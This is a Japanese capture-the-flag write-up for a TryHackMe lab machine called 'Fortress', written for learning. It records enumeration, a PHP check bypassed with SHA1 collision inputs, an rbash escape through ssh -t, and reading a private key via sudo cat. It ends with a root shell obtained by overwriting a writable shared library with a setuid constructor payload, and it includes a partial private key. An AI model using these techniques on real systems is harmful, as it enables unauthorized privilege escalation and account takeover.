# Fortress CTF

https://tryhackme.com/room/fortress

## Enumeration

```shell
TARGET=10.10.202.145
sudo bash -c "echo $TARGET   fortress temple.fortress >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

Open 10.10.202.145:22
Open 10.10.202.145:5581
Open 10.10.202.145:5752
Open 10.10.202.145:7331
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 16:08 JST
Initiating Ping Scan at 16:08
Scanning 10.10.202.145 [4 ports]
Completed Ping Scan at 16:08, 0.27s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:08
Scanning fortress (10.10.202.145) [4 ports]
Discovered open port 22/tcp on 10.10.202.145
Discovered open port 5581/tcp on 10.10.202.145
Discovered open port 5752/tcp on 10.10.202.145
Discovered open port 7331/tcp on 10.10.202.145
Completed SYN Stealth Scan at 16:08, 0.27s elapsed (4 total ports)
Nmap scan report for fortress (10.10.202.145)
Host is up, received reset ttl 61 (0.25s latency).
Scanned at 2025-06-21 16:08:11 JST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 61
5581/tcp open  tmosms1 syn-ack ttl 61
5752/tcp open  unknown syn-ack ttl 61
7331/tcp open  swx     syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (216B)
```

```sh
root@ip-10-10-50-67:~# sudo nmap -sS -sV -p22,5581,5752,7331 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-21 08:09 BST
Nmap scan report for fortress (10.10.202.145)
Host is up (0.00069s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5581/tcp open  ftp     vsftpd 3.0.3
5752/tcp open  unknown
7331/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

- 22:SSH
- 5581:FTP
- 5752:?
- 7331:HTTP

### FTP

anonymous で 2 ファイル取得。

```sh
$ ftp $TARGET -p 5581
Connected to 10.10.202.145.
220 (vsFTPd 3.0.3)
Name (10.10.202.145:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||51808|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 .
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 ..
-rw-r--r--    1 ftp      ftp          1255 Jul 25  2021 .file
-rw-r--r--    1 ftp      ftp           305 Jul 25  2021 marked.txt
```

```sh
$ cat marked.txt
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

.file は、コンパイルされた Python ファイル。

```sh
$ file .file
.file: python 2.7 byte-compiled
```

[pycdc](https://github.com/zrax/pycdc) でデコンパイル

```python
$ pycdc .file
# Source Generated with Decompyle++
# File: .file (Python 2.7)

import socket
import subprocess
from Crypto.Util.number import bytes_to_long
usern = [REDACTED]
passw = [REDACTED]
port = 5752
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)

def secret():
    with open('secret.txt', 'r') as f:
        reveal = f.read()
        return reveal

while True:

    try:
        (conn, addr) = s.accept()
        conn.send('\n\tChapter 1: A Call for help\n\n')
        conn.send('Username: ')
        username = conn.recv(1024).decode('utf-8').strip()
        username = bytes(username, 'utf-8')
        conn.send('Password: ')
        password = conn.recv(1024).decode('utf-8').strip()
        password = bytes(password, 'utf-8')
        if bytes_to_long(username) == usern and bytes_to_long(password) == passw:
            directory = bytes(secret(), 'utf-8')
            conn.send(directory)
            conn.close()
        else:
            conn.send('Errr... Authentication failed\n\n')
            conn.close()
    continue
    continue
    continue
```

5752 ポートが何であるか判明した。

usern, passw を hex2ascii すると、ユーザー名とパスワードになる。

```sh
$ nc $TARGET 5752

        Chapter 1: A Call for help

Username: [REDACTED]
Password: [REDACTED]
[REDACTED]
```

### サブドメイン

サブドメインは検出できなかったが、temple サブドメインもただの Apache 初期ページで検出できなかったので、絶対に存在しないとは言い切れない。

```shell
$ ffuf -u http://fortress:7331 -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.fortress' -fs 10918
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://fortress:7331 -w ./dirlist.txt -t 30 -k

===============================================================
/assets               (Status: 301) [Size: 312] [--> http://fortress:7331/assets/]
/private.php          (Status: 200) [Size: 0]
===============================================================
```

private.php を発見。  
temple サブドメインでも同じ結果になった。

private.php のパラメータとして先ほど入手したシークレットを渡すファジングをしたが、ヒットしなかった。

```sh
ffuf -u http://fortress:7331/private.php?FUZZ=[REDACTED] -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

POST も空振り。

```sh
$ ffuf -u http://fortress:7331/private.php -X POST -d 'FUZZ=[REDACTED]' \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs 0 -c
```

temple.fortress サブドメインに対して同じファジングを実行しても空振り。

行き詰ったので状況整理。次がパズルのピース。

1. 入手したシークレット
2. private.php
3. ルーム説明で示唆されている temple.fortress サブドメイン
4. veekay というユーザー名

シークレットに拡張子 .php を付けるのが正解だった。

```html
<html>
  <head>
    <title>Chapter 2</title>
    <link rel="stylesheet" href="assets/style.css" type="text/css" />
  </head>
  <body>
    <div id="container">
      <video width="100%" height="100%" autoplay>
        <source src="./assets/flag_hint.mp4" type=video/mp4>
      </video>

      <!-- Hmm are we there yet?? May be we just need to connect the dots -->

      <!--    <center>
			<form id="login" method="GET">
				<input type="text" required name="user" placeholder="Username"/><br/>
				<input type="text" required name="pass" placeholder="Password" /><br/>
				<input type="submit"/>
			</form>
		</center>
-->
    </div>
  </body>
</html>
```

Sonic Visualiser で mp4 のスペクトルを確認したが、文字らしきものは出なかった。

同じ PHP に、`?user=admin&pass=abc`というパラメータを付けて GET したら、`Nah, babe that ain't gonna work` という表示が増えた。

/assets/style.css にも下記ヒントが含まれている。

```css
/*Am I a hint??

	VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4=
*/
```

しかし、謎が１つ増えた。  
守護者同士を衝突させてキーを得ろと書いているが、守護者とは？

```
This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.
```

PHP に指定する user, pass パラメータを特定する必要がある。  
文脈的に、user は `veekay` の可能性がある。

全く分からずウォークスルーをチラ見した。

答え：拡張子を html にする

```html
<html>
  <head>
    <title>Chapter 2</title>
    <link rel="stylesheet" href="assets/style.css" type="text/css" />
  </head>
  <body>
    <div id="container">
      <center><h1>The Temple of Sins</h1></center>

      <center>
        <img src="./assets/guardians.png" width="700px" height="400px" />
      </center>

      <!--
<?php
require 'private.php';
$badchar = '000000';
if (isset($_GET['user']) and isset($_GET['pass'])) {
    $test1 = (string)$_GET['user'];
    $test2 = (string)$_GET['pass'];

    $hex1 = bin2hex($test1);
    $hex2 = bin2hex($test2);
    

    if ($test1 == $test2) {
        print 'You can't cross the gates of the temple, GO AWAY!!.';
    } 
    
    else if(strlen($test2) <= 500 and strlen($test1) <= 600){
    	print "<pre>Nah, babe that ain't gonna work</pre>";
    }

    else if( strpos( $hex1, $badchar ) or strpos( $hex2, $badchar )){
    	print '<pre>I feel pitty for you</pre>';
    }
    
    else if (sha1($test1) === sha1($test2)) {
      print "<pre>'Private Spot: '$spot</pre>";
    } 
    
    else {
        print '<center>Invalid password.</center>';
    }
}
?>
-->

      <!-- Don't believe what you see... This is not the actual door to the temple. -->
      <center>
        <form id="login" method="GET">
          <input
            type="text"
            required
            name="user"
            placeholder="Username"
          /><br />
          <input
            type="text"
            required
            name="pass"
            placeholder="Password"
          /><br />
          <input type="submit" />
        </form>
      </center>
    </div>
  </body>
</html>
```

PHP の実装が判明。

- test1 と test2 の sha1 ハッシュを比較し一致が必要
- test1 と test2 は異なる文字列
- test2 の文字列長は、501 以上である必要

http://73spica.tech/blog/sha1-collision/ で SHA1 衝突について学ぶ。

- 2017 年、異なる２つの PDF で同じ SHA1 ハッシュになるパターンを Google が発表した。
- 先頭 320 バイトの部分で衝突が発生し、それ以降は同じハッシュ値になる。

つまり、その 2 つの PDF ファイルの先頭 501 バイトをそれぞれ切り出して GET パラメータとして送ればよいと思われる。

```sh
$ head -c 501 ./shattered-1.pdf > out-1.pdf

$ head -c 501 ./shattered-2.pdf > out-2.pdf
```

```python
import requests

pdf1 = requests.get("http://localhost:8000/out-1.pdf")
pdf2 = requests.get("http://localhost:8000/out-2.pdf")

params = {'user': pdf1.content, 'pass': pdf2.content}
r = requests.get("http://fortress:7331/[REDACTED].php/",params=params)
print (r.text)
```

`I feel pitty for you` が返る。shattered-1.pdf は封じられているらしい。

自分で適当に作った PDF をもとに [sha1collider](https://github.com/nneonneo/sha1collider/tree/master) で SHA1 が一致する PDF を作り、同じことをした。

```sh
$ python ./collide.py ../fortress.pdf ../fortress2.pdf

$ head -c 501 ./out-fortress.pdf > out-1.pdf
head -c 501 ./out-fortress2.pdf > out-2.pdf
collider]

$ sha1sum ./*.pdf
723dd3ea75a0df5134549645a1e3ef9ef16fef1d  ./out-1.pdf
723dd3ea75a0df5134549645a1e3ef9ef16fef1d  ./out-2.pdf
```

それでも `I feel pitty for you` が返った。

https://github.com/cr-marcstevens/hashclash で SHA1 文字列を生成することを目指したが、使い方が分からなかった。（MD5 なら簡単だったが）

https://sha-mbles.github.io/ から messageA, messageB をダウンロード。サイズがちょうどいい。

```python
import requests

msg1 = requests.get("http://localhost:8000/messageA")
msg2 = requests.get("http://localhost:8000/messageB")

params = {'user': msg1.content, 'pass': msg2.content}
r = requests.get("http://fortress:7331/[REDACTED].php/",params=params)
print (r.text)
```

テキストファイル名が返ってきた。

```html
<pre>
'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: '[REDACTED].txt</pre
>
```

秘密鍵

```
"The Temple guards won't betray us, but I fear of their foolishness that will take them down someday.
I am leaving my private key here for you j4x0n. Prepare the fort, before the enemy arrives"
												- h4rdy

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxxO1IrpzA3klEYGFfD+4wUr5Q85IEEAIpwC+zY547gPJ5xIJE76j
...
```

SSH でログイン可能。

```sh
$ ssh h4rdy@10.10.154.39 -i ./id_rsa
```

## rbash

使えるコマンドが極度に制限されている。

```sh
h4rdy@fortress:~$ pwd
/home/h4rdy

h4rdy@fortress:~$ ls -al
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

h4rdy@fortress:~$ echo $PATH
/home/h4rdy
```

ビルトインコマンドでファイルを読む。

```sh
h4rdy@fortress:~$ while IFS= read -r line; do
>   echo "$line"
> done < user.txt
-rbash: user.txt: No such file or directory
```

/etc/passwd

```sh
h4rdy@fortress:~$ while IFS= read -r line; do
>   echo "$line"
> done < /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
j4x0n:x:1000:1000:j4x0n,,,:/home/j4x0n:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:111:118:ftp daemon,,,:/srv/ftp:/bin/false
veekay:x:1001:1001::/home/veekay:/bin/bash
h4rdy:x:1002:1002::/home/h4rdy:/bin/rbash
```

そもそもどうやって制限されてるかというと、rbash（制限付き bash）のため。

```sh
h4rdy@fortress:~$ echo $0
-rbash
```

ssh の -t オプションで回避できた。

```sh
$ ssh h4rdy@10.10.154.39 -i ./id_rsa -t "bash --noprofile"

h4rdy@fortress:~$ echo $0
bash

h4rdy@fortress:~$ ls -al
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
```

絶対パスならコマンドを実行できる。

```sh
h4rdy@fortress:~$ /bin/ls -al
total 28
drwxr-xr-x 4 h4rdy h4rdy 4096 Jun 22 14:30 .
drwxr-xr-x 5 root  root  4096 Jul 25  2021 ..
-rw------- 1 h4rdy h4rdy  879 Jun 22 14:30 .bash_history
-r--r--r-- 1 root  root  3130 Jul 25  2021 .bashrc
drwx------ 2 h4rdy h4rdy 4096 Jun 22 14:03 .cache
-r--r--r-- 1 root  root    17 Jul 25  2021 .profile
drwxr-xr-x 2 h4rdy h4rdy 4096 Jul 25  2021 .ssh
```

フラグを見つけたが、すぐには読めない。

```sh
h4rdy@fortress:~$ /bin/ls -al ../j4x0n
total 32
drwxr-xr-x 3 j4x0n j4x0n 4096 Jul 26  2021 .
drwxr-xr-x 5 root  root  4096 Jul 25  2021 ..
lrwxrwxrwx 1 j4x0n j4x0n    9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r-- 1 j4x0n j4x0n  220 Jul 25  2021 .bash_logout
-rw-r--r-- 1 j4x0n j4x0n 3771 Jul 25  2021 .bashrc
-r--r--r-- 1 root  root   187 Jul 25  2021 endgame.txt
-rw-r--r-- 1 j4x0n j4x0n  655 Jul 25  2021 .profile
drwxr-xr-x 2 j4x0n j4x0n 4096 Jul 25  2021 .ssh
-r-------- 1 j4x0n j4x0n   33 Jul 25  2021 user.txt
```

## 権限昇格１

endgame.txt

```sh
h4rdy@fortress:/home/j4x0n$ /bin/cat endgame.txt
Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.
```

j4x0n が so ファイルのオーナーになっているのは気になる。

```sh
h4rdy@fortress:/home/j4x0n$ /usr/bin/find / -user j4x0n -type f -not -path "/proc/*" 2>/dev/null
/usr/lib/libfoo.so
/home/j4x0n/.bash_logout
/home/j4x0n/.ssh/authorized_keys
/home/j4x0n/.ssh/id_rsa.pub
/home/j4x0n/.ssh/id_rsa
/home/j4x0n/.bashrc
/home/j4x0n/.profile
/home/j4x0n/user.txt

h4rdy@fortress:/home/j4x0n$ /bin/ls -al /usr/lib/libfoo.so
-rwxrwxr-x 1 j4x0n j4x0n 16080 Jul 26  2021 /usr/lib/libfoo.so
```

/opt/bt には root の SUID が付いており、j4x0n 所有の so をリンクしている。

```sh
h4rdy@fortress:/home/j4x0n$ /bin/ls -al /opt
total 28
drwxr-xr-x  2 root root  4096 Jul 26  2021 .
drwxr-xr-x 23 root root  4096 Jul 25  2021 ..
-rwsrwxr-x  1 root root 16696 Jul 26  2021 bt

h4rdy@fortress:/home/j4x0n$ /usr/bin/file /opt/bt
/opt/bt: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb7bf398a6ca5b7782a85f0afcdd3554d44ca151, for GNU/Linux 3.2.0, not stripped

h4rdy@fortress:/home/j4x0n$ /usr/bin/ldd /opt/bt
        linux-vdso.so.1 =>  (0x00007ffd7e5ed000)
        libfoo.so => /usr/lib/libfoo.so (0x00007fd0417ef000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd041212000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd0415dc000)
```

j4x0n に昇格成功した場合に、これを利用して root 昇格できると思われる。

フルパス指定が面倒になったので PATH 追加。

```sh
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:$PATH
```

cat を j4x0n として実行できる。

```sh
h4rdy@fortress:/home/j4x0n$ sudo -l
Matching Defaults entries for h4rdy on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User h4rdy may run the following commands on fortress:
    (j4x0n) NOPASSWD: /bin/cat
```

j4x0n の SSH 秘密鍵入手。

```sh
h4rdy@fortress:/home/j4x0n$ sudo -u j4x0n cat .ssh/id_rsa
```

## 権限昇格２

先に見つけていたこの弱点。

```sh
h4rdy@fortress:/home/j4x0n$ /bin/ls -al /opt
total 28
drwxr-xr-x  2 root root  4096 Jul 26  2021 .
drwxr-xr-x 23 root root  4096 Jul 25  2021 ..
-rwsrwxr-x  1 root root 16696 Jul 26  2021 bt

h4rdy@fortress:/home/j4x0n$ /usr/bin/file /opt/bt
/opt/bt: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb7bf398a6ca5b7782a85f0afcdd3554d44ca151, for GNU/Linux 3.2.0, not stripped

h4rdy@fortress:/home/j4x0n$ /usr/bin/ldd /opt/bt
        linux-vdso.so.1 =>  (0x00007ffd7e5ed000)
        libfoo.so => /usr/lib/libfoo.so (0x00007fd0417ef000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd041212000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd0415dc000)
```

so を上書きして bt を実行したら、任意のコードを実行できるはず。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setgid(0);
        setuid(0);
        system("/bin/bash -p");
}
```

```c
gcc -fPIC -shared -o /usr/lib/libfoo.so src.c -nostartfiles
```

root シェルゲット！

```sh
j4x0n@fortress:~$ /opt/bt
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@fortress:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(j4x0n)
```

```sh
root@fortress:~# cat /root/root.txt
3a17.............................

root@fortress:~# cat /root/note.txt


Well done!! If you did this box without any help... Without any hints... You did a REAL GREAT JOB!! In that case, I am definitely sure that you have learnt a few things from this small challenge box. As this was the end of Chapter 3: Showdown... The story of fortress conquered by j4x0n and his alliance came to an end.


And if you were interested in what happened to j4x0n (aka me) after you took control over the fortress. Tbh, he went insanely furious for this loss... The politics he played, the kingdom he built so far came to a tremendous end. Feeling the hatred, the sorrow he escaped into a dense forest before someone could notice. Not sure, if he is gonna survive the wildery of those jungles... But if he does... Well, m4y th3 l0r6 s4v3 u5 4ll.
```

## 振り返り

- シークレットに拡張子 php を付けること、それが成功した後に、html を付けて試すことは思いつき難かった。拡張子でファジングすればよかった。
- rbash は初見。少なくとも触ったのは初めて。
- SHA1 衝突のチャレンジは初見。MD5 なら衝突する文字列を生成できた。ただし、PREFIX を指定できるだけで、大部分はランダムになる。
- SHA1 は PDF しか生成できなかった。（PDF で可能なのであれば、たぶん方法はあると思う）

### 整理

全ての始まりの PDF  
https://shattered.io/

MessageA,B  
https://sha-mbles.github.io/

SHA1 が衝突する PDF を簡単に作れる（PDF としての妥当性は不明）  
https://github.com/nneonneo/sha1collider/tree/master

MD5 の衝突文字列は作れた。SHA1 のツールが含まれるが使い方不明。  
https://github.com/cr-marcstevens/hashclash

## Tags

#tags:SHA1衝突 #tags:rbash #tags:制限シェル
